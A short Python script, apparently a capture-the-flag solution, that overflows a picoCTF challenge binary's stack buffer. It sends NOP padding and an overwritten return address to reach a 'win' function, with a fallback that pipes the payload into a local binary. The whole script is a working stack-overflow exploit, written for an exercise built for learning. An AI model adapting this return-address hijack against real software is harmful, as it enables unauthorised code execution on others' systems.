import base64
import socket
import os

host = "saturn.picoctf.net"
port = 50930
nop = b'\x90' * 44
ret = b'\xf6\x91\x04\x08' # 0x080491f6 --> address win function
stack = nop + ret

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
    try:
        client.connect((host, port))
        print(f"[+] connect {host}:{port}")
        banner = client.recv(2048)
        client.send(stack + b'\n\r')
        print(f"[+] send payload --> {stack}")
        flag = client.recv(1024)
        print(flag.decode("utf-8"))

    except:
        payload = base64.b64encode(stack).decode("utf-8")
        os.system(f'(echo {payload} | base64 -d) | ./vuln')

